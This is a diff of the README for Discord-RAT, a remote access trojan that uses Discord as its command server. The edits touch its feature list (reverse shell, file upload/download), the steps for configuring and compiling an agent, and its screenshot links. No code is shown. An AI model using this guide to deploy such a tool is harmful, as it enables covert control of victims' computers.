@@ -1,3 +1,5 @@
+## Discord-RAT has been rewritten! Check it out and give it a star! ⭐
+
 <p align="center">
   <a href="#">
     <img src="img/logo.png" alt="logo" width="190" height="190">
@@ -30,14 +32,14 @@ Discord-RAT is a cross-platform RAT that uses Discord as an interactive C2 Serve
     ·
     <a href="https://github.com/codeuk/discord-rat/issues">Request Feature</a>
     ·
-    <a href="https://github.com/codeuk/discord-rat#features">Features</a>
+    <a href="https://github.com/codeuk/discord-rat#commands">Features</a>
     ·
     <a href="https://github.com/codeuk/discord-rat#screenshots">Screenshots</a>
   </p>
 </div>
 
 ## About Discord-RAT
-Discord-RAT can handle many clients concurrently, along with archiving, Windows and Linux compatibility (cross-platform), upload/download and reverse shell functionality.
+Discord-RAT can handle many clients concurrently, along with archiving, Windows and Linux compatibility (cross-platform), upload/downloading, reverse shell functionality, and much, much [more](https://github.com/codeuk/discord-rat#screenshots)!.
 
 This tool has been recently rewritten in [GoLang](https://go.dev), please star ⭐ it to show your support!
 
@@ -97,8 +99,11 @@ In order to obtain a server ID on Discord you need to enable Developer Mode:
 - You may or may not need to restart your Discord client, but usually it’s applied automatically
 
 - Now that you have Developer Mode enabled, right click on the desired server icon you wish to obtain the ID of
-- Select Copy ID in the context menu to copy it to your clipboard
+- Select Copy ID in the menu shown to copy it to your clipboard
 
+![context_menu](https://github.com/codeuk/discord-rat/assets/75194878/b4e95d04-38e6-4938-9323-470e1fe79d16)
+
+  
 You can now paste the Server ID in the `pkg/util/config.go` file!
 </details>
 
@@ -121,9 +126,10 @@ Now that you have successfully configured and compiled a Discord-RAT agent, you 
 
 Once opened, the Bot will create a channel with a channel name derived from the host (the machine running the Discord-RAT program) computer's external IP address (ex. 1851371261278) and will send a `New Agent Connected` embed along with the `Command Menu` embed, which lists all default commands you can use.
 
-*When the agent exits or shuts down, the channel will be archived (#channel -> #archive-channel) if `DeleteOnExit` is set to false.*
+- Always make sure to use the correct commands based on the operating system the agent is using (`dir` for displaying Windows files, and `ls` for Linux, etc.).
+- Make sure to read the [commands](https://github.com/codeuk/discord-rat#commands) section before executing anything so you know what you're doing.
 
-*Make sure to read the [commands](https://github.com/codeuk/discord-rat#commands) section before executing anything so you know what you're doing.*
+*When the agent exits or shuts down, the channel will be archived (#channel -> #archive-channel) if `DeleteOnExit` is set to false.*
 
 ## Showcase
 > **Note**
@@ -132,10 +138,10 @@ Once opened, the Bot will create a channel with a channel name derived from the 
 ## Screenshots
 <img src="https://github.com/codeuk/discord-rat/assets/75194878/0ca032a6-3184-4069-9265-86734bef6e55" alt="New Connection Win" width=50% height=50%><img src="https://github.com/codeuk/discord-rat/assets/75194878/352cf9e8-fead-4cb5-92ab-dd4aee6eab7b" alt="New Connection Linux" width=50% height=50%>
 
-![Command Menu](https://github.com/codeuk/discord-rat/assets/75194878/06d244ff-26a8-440a-9721-8c952b65b4c7)
+![Command Menu](https://github.com/codeuk/discord-rat/assets/75194878/d9826607-8d79-4ee4-8a49-54b68cf97818)
 
 ## Commands
-When all commands have been fully developed, I'll leave full documentation and guides for each command that Discord-RAT allows you to use; but at the moment, only the commands listed in the **Command Menu** have been development, and are still to be improved in future updates.
+When all commands have been fully developed, I'll leave full documentation and guides for each command that Discord-RAT allows you to use; but at the moment, only the commands listed in the **Command Menu** have been developed, and are still to be improved in future updates.
 
 ## Disclaimer
 Discord-RAT is intended for legal and ethical use only. The developers and contributors of Discord-RAT are not responsible for any illegal or unethical activities performed using this tool. Users of Discord-RAT are solely responsible for their actions and are advised to use the tool for legitimate security testing purposes only. Reselling this program as a closed-source binary could have legal consequences, please do not steal the source.
